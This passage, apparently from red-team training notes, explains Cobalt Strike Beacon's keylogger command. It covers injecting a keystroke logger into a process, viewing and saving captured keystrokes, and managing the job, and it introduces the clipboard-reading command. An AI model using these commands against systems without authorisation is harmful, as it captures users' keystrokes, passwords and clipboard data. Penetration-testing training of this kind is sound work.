The Cobalt Strike keylogger will log the key presses made by the user who owns the process the post-ex capability is injected into.

```powershell
beacon> help keylogger
Use: keylogger [pid] [x86|x64]
     keylogger

Inject a keystroke logger into the specified process.

Use keylogger with no arguments to spawn a temporary process and inject the 
keystroke logger into it.

To terminate this task: use jobs to find the job ID. Use jobkill to kill it.
```

The output is not sent to the Beacon console, but a dedicated tab that can be accessed via **View > Keystrokes**.

You can right-click on a row and select **Save** to sync the output to a text file on your local computer, or select **Delete** to remove it altogether.

The keylogger runs as a long-term job, which can be seen with the `jobs` command and stopped with the `jobkill` command.

```powershell
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    3020  keystroke logger

beacon> jobkill 0
[+] job 0 completed
```

The content of the user's clipboard can be read with the `clipboard` command.Â  The output, if text, is printed directly to the Beacon console.
```powershell
